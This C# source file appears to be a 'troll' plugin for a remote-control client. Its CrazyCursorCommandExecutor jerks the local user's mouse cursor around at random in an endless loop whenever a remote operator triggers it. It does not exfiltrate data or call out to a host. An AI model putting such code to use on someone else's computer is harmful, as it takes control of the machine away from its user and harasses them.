using System;
using System.Drawing;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Tasks.Infrastructure.Client.Library;
using TrollCommands.Shared.Commands;

namespace TrollCommands.Client.Commands
{
    public class CrazyCursorCommandExecutor : ITaskExecutor<CrazyCursorCommandInfo>
    {
        public async Task<HttpResponseMessage> InvokeAsync(CrazyCursorCommandInfo commandInfo, TaskExecutionContext context,
            CancellationToken cancellationToken)
        {
            var random = new Random();

            while (true)
            {
                var cursorLocation = Cursor.Position;
                var factorX = random.NextDouble() >= 0.5 ? -1 : 1;
                var factorY = random.NextDouble() >= 0.5 ? -1 : 1;

                Cursor.Position = new Point(cursorLocation.X + (commandInfo.Power + (int) (commandInfo.Power * 5 * random.NextDouble())) * factorX,
                    cursorLocation.Y + (commandInfo.Power + (int) (commandInfo.Power * 5 * random.NextDouble())) * factorY);

                await Task.Delay(commandInfo.Delay, cancellationToken);
            }
        }
    }
}